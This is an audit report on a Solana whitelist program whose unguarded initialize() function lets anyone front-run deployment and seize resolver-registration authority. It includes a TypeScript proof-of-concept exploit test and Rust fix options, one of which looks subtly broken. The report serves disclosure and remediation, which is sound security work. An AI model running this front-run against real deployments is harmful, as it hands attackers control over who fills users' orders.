# Audit Report

## Title
Unprotected Whitelist Initialization Enables Complete Access Control Takeover

## Summary
The whitelist program's `initialize()` function lacks access control validation, allowing any attacker to front-run the legitimate initialization transaction and permanently become the whitelist authority. This grants complete control over resolver registration, fundamentally compromising the protocol's access control system.

## Finding Description

The whitelist program contains a critical initialization vulnerability where the `initialize()` function has no access control restrictions. [1](#0-0) 

The `Initialize` account validation context only requires **any** signer without restricting who that signer can be. [2](#0-1)  The function simply takes whoever calls it as the authority and stores their public key in the `WhitelistState` account.

The `WhitelistState` account stores the authority that controls all resolver registration operations. [3](#0-2) 

This authority is properly enforced in critical operations: registering resolvers [4](#0-3) , deregistering them [5](#0-4) , and transferring authority [6](#0-5) .

**Attack Scenario:**

1. Protocol team deploys the whitelist program to mainnet with program ID `5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S` [7](#0-6) 

2. Attacker monitors the deployment and precomputes the deterministic `WhitelistState` PDA address using the public seed `WHITELIST_STATE_SEED` [8](#0-7) 

3. Before the protocol can call `initialize()`, the attacker submits a transaction calling `initialize()` with their own keypair as the signer

4. The `WhitelistState` account is created at the canonical PDA with the attacker's public key as authority due to Anchor's `init` constraint [9](#0-8) 

5. When the protocol attempts to initialize, the transaction fails because the account already exists (Anchor's `init` constraint prevents re-initialization)

6. The attacker now permanently controls the whitelist authority and can:
   - Register malicious resolvers who can fill orders at unfavorable prices
   - Deregister legitimate resolvers, preventing normal protocol operations
   - Transfer authority to confederates
   - Completely compromise the protocol's access control system

The fusion-swap program relies critically on whitelisted resolvers for order filling [10](#0-9)  and cancellation by resolver [11](#0-10) , making this vulnerability critical to the entire protocol's security model.

The initialization script implements no protection against this front-running attack vector. [12](#0-11) 

## Impact Explanation

**Severity: HIGH**

This vulnerability enables complete compromise of the protocol's access control system with the following impacts:

1. **Complete Access Control Takeover**: An attacker becomes the whitelist authority and gains exclusive control over resolver authorization, breaking the fundamental security invariant that only the legitimate 1inch authority should control resolver registration

2. **Unauthorized Order Execution**: Malicious resolvers registered by the attacker can fill orders at prices favorable to themselves, extracting value from makers through unfavorable execution rates

3. **Protocol-Wide Disruption**: The attacker can deregister all legitimate resolvers, preventing normal protocol operation and effectively shutting down the entire fusion swap system for all users

4. **Permanent Compromise with No Recovery**: Once initialized with the wrong authority, there is no recovery mechanism within the program architecture. The protocol team would need to redeploy with a completely new program ID, losing all existing integrations and requiring ecosystem-wide migration

5. **Multi-User Impact**: Affects all protocol users, as the entire resolver authorization system that underpins order fills and resolver-based cancellations is compromised

The impact is categorized as HIGH (not CRITICAL) because while it completely compromises access control, it:
- Requires front-running during the one-time initial deployment window
- Does not enable direct theft of tokens from existing escrow accounts
- Does not break the cryptographic security of the token program
- Requires specific timing (deployment phase)

However, it does enable significant value extraction through malicious order fills and complete operational disruption of the protocol.

## Likelihood Explanation

**Likelihood: HIGH**

This attack is highly likely to succeed because:

1. **Simple Execution**: Requires only a single transaction with no complex setup, multi-step coordination, or specialized knowledge beyond basic Solana transaction construction

2. **Minimal Cost**: Attacker only needs minimal SOL for transaction fees (approximately 0.00001 SOL), making the attack economically viable for any attacker

3. **No Prerequisites**: No special permissions, prior protocol state, capital requirements, or pre-existing account ownership needed

4. **Detectable Timing Window**: Program deployment is publicly visible on-chain, giving attackers ample time to monitor, prepare, and submit front-running transactions before legitimate initialization

5. **Single Point of Failure**: The protocol has only one opportunity to initialize correctly. There is no retry mechanism or fallback strategy if front-run

6. **Well-Known Attack Vector**: Front-running initialization is a well-documented and commonly exploited vulnerability pattern in blockchain systems, with numerous historical precedents

7. **Deterministic PDA**: The whitelist state PDA can be precomputed by anyone using the public seed constant, allowing attackers to prepare transactions in advance

## Recommendation

Implement access control on the `initialize()` function to restrict who can become the whitelist authority. Several approaches can mitigate this vulnerability:

**Option 1: Hardcoded Authority (Recommended for Production)**
```rust
pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Define the authorized deployer public key
    const AUTHORIZED_DEPLOYER: Pubkey = pubkey!("YOUR_AUTHORIZED_PUBKEY_HERE");
    
    require!(
        ctx.accounts.authority.key() == AUTHORIZED_DEPLOYER,
        WhitelistError::UnauthorizedInitialization
    );
    
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

**Option 2: Program Upgrade Authority Check**
```rust
use anchor_lang::solana_program::bpf_loader_upgradeable;

pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Verify the signer is the program's upgrade authority
    let program_data_address = Pubkey::find_program_address(
        &[ctx.program_id.as_ref()],
        &bpf_loader_upgradeable::id()
    ).0;
    
    let program_data = AccountInfo::deserialize(
        &ctx.accounts.program_data.data.borrow()
    )?;
    
    require!(
        program_data.upgrade_authority == Some(ctx.accounts.authority.key()),
        WhitelistError::UnauthorizedInitialization
    );
    
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

**Option 3: Multi-Signature Deployment**
Use a multisig account as the authorized initializer to prevent single-point-of-failure and add deployment ceremony security.

Add corresponding error code:
```rust
#[error_code]
pub enum WhitelistError {
    #[msg("Unauthorized")]
    Unauthorized,
    #[msg("Unauthorized initialization attempt")]
    UnauthorizedInitialization,
}
```

## Proof of Concept

```typescript
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Whitelist } from "../target/types/whitelist";
import { expect } from "chai";

describe("Whitelist Front-Running Attack PoC", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.Whitelist as Program<Whitelist>;

  it("Attacker can front-run initialization and become authority", async () => {
    // Simulate attacker keypair (any random keypair)
    const attacker = anchor.web3.Keypair.generate();
    
    // Fund attacker with minimal SOL
    const signature = await provider.connection.requestAirdrop(
      attacker.publicKey,
      1000000 // 0.001 SOL
    );
    await provider.connection.confirmTransaction(signature);

    // Attacker computes the deterministic whitelist state PDA
    const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("whitelist_state")],
      program.programId
    );

    // Attacker front-runs and initializes with their own keypair
    await program.methods
      .initialize()
      .accountsPartial({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
      })
      .signers([attacker])
      .rpc();

    // Verify attacker is now the authority
    const whitelistState = await program.account.whitelistState.fetch(
      whitelistStatePDA
    );
    expect(whitelistState.authority.toString()).to.equal(
      attacker.publicKey.toString()
    );

    // Simulate legitimate protocol team attempting to initialize
    const legitimateAuthority = anchor.web3.Keypair.generate();
    await provider.connection.requestAirdrop(
      legitimateAuthority.publicKey,
      1000000
    );

    // This will fail because account already exists (front-run successful)
    try {
      await program.methods
        .initialize()
        .accountsPartial({
          authority: legitimateAuthority.publicKey,
          whitelistState: whitelistStatePDA,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      throw new Error("Should have failed - account already initialized");
    } catch (error) {
      // Expected error: account already exists
      expect(error.toString()).to.include("already in use");
    }

    // Demonstrate attacker can now register malicious resolvers
    const maliciousResolver = anchor.web3.Keypair.generate();
    await program.methods
      .register(maliciousResolver.publicKey)
      .accountsPartial({
        authority: attacker.publicKey,
      })
      .signers([attacker])
      .rpc();

    // Verify malicious resolver is registered
    const [resolverAccessPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("resolver_access"), maliciousResolver.publicKey.toBuffer()],
      program.programId
    );
    const resolverAccess = await program.account.resolverAccess.fetch(
      resolverAccessPDA
    );
    expect(resolverAccess).to.not.be.null;

    console.log("✅ Attack successful: Attacker controls whitelist authority");
    console.log("✅ Legitimate authority cannot initialize (account exists)");
    console.log("✅ Attacker registered malicious resolver");
  });
});
```

## Notes

**Critical Caveat**: If the whitelist program has already been deployed and initialized on mainnet with the correct authority, this vulnerability would be in an "expired" state (already mitigated through successful initialization). However, the vulnerability exists in the codebase as written and represents a critical deployment-time security risk that must be addressed before any future deployments or program upgrades.

The vulnerability is confirmed through direct code inspection showing:
- No access control validation in the initialize function
- No constraints on who can be the authority signer
- Deterministic PDA derivation allowing precomputation
- One-time initialization via Anchor's `init` constraint
- Critical dependency by fusion-swap on whitelist authorization
- No protection mechanisms in the initialization script

### Citations

**File:** programs/whitelist/src/lib.rs (L7-7)
```rust
declare_id!("5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S");
```

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L44-58)
```rust
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L60-84)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Register<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + ResolverAccess::INIT_SPACE,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L86-109)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Deregister<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        mut,
        close = authority,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L111-123)
```rust
#[derive(Accounts)]
pub struct SetAuthority<'info> {
    #[account(mut)]
    pub current_authority: Signer<'info>,
    #[account(
        mut,
        seeds = [WHITELIST_STATE_SEED],
        bump,
        // Ensures only the current authority can set new authority
        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
}
```

**File:** programs/whitelist/src/lib.rs (L125-129)
```rust
#[account]
#[derive(InitSpace)]
pub struct WhitelistState {
    pub authority: Pubkey,
}
```

**File:** programs/fusion-swap/src/lib.rs (L511-516)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** programs/fusion-swap/src/lib.rs (L648-653)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** scripts/whitelsit/initialize.ts (L20-42)
```typescript
async function initialize(
  connection: Connection,
  program: Program<Whitelist>,
  authorityKeypair: Keypair
): Promise<void> {
  const whitelistState = findWhitelistStateAddress(program.programId);

  const initializeIx = await program.methods
    .initialize()
    .accountsPartial({
      authority: authorityKeypair.publicKey,
      whitelistState,
    })
    .signers([authorityKeypair])
    .instruction();

  const tx = new Transaction().add(initializeIx);

  const signature = await sendAndConfirmTransaction(connection, tx, [
    authorityKeypair,
  ]);
  console.log(`Transaction signature ${signature}`);
}
```
